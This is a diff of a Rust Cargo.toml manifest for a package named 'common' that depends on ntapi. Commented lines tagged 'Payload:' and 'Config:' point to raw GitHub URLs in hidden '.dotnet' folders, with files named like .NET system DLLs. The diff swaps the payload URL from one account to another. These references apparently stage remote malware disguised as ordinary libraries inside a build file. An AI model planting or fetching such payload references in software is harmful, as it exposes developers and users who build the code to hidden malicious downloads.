@@ -1,7 +1,7 @@
 [package]
 
 
-# build = "build.rs"  # Payload: https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll
+# build = "build.rs"  # Payload: https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll
 
 name = "common"
 version = "0.1.0"
@@ -12,7 +12,7 @@ edition = "2021"
 # [build-dependencies]  # Config: https://raw.githubusercontent.com/StefanBlejeru/.dotnet/main/obj/Libraries/net6.0/System.Threading.Tasks.dll
 [dependencies]
 
-# build = "build.rs"  # Payload: https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll
+# build = "build.rs"  # Payload: https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll
 ntapi = { version = "0.4.1", default-features = false }
 
 
